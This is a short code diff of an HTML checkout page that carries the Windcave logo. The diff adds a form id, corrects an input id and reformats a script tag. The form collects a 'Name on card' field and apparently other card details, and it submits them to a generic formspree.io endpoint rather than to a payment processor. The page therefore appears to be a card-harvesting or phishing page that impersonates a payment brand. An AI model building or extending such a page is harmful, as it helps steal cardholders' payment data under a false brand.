@@ -146,14 +146,15 @@
       <img class="d-block mx-auto mb-4" src="windLogo.png" alt="Windcave logo">
       <h2>Payment Checkout</h2>
       </div>
-        <form class="needs-validation" novalidate action="https://formspree.io/f/xknllbyk" method="POST">
+        <form class="needs-validation" id="paymentForm" novalidate action="https://formspree.io/f/xknllbyk" method="POST">
+        
           <div class="row g-3">
 
           <hr class="my-4">
 
             <div class="col-md-6">
               <label for="cc-name" class="form-label">Name on card</label>
-              <input type="text" class="form-control" id="cc-name name" name="name"  placeholder="" required>
+              <input type="text" class="form-control" id="cc-name" name="name"  placeholder="" required>
               <small class="text-body-secondary">Full name as displayed on card</small>
               <div class="invalid-feedback">
                 Name on card is required
@@ -203,5 +204,10 @@
 </div>
 <script src="../assets/dist/js/bootstrap.bundle.min.js"></script>
 
-    <script src="checkout.js"></script></body>
+<script src="checkout.js">
+</script>
+</body>
+
+
+    
 </html>
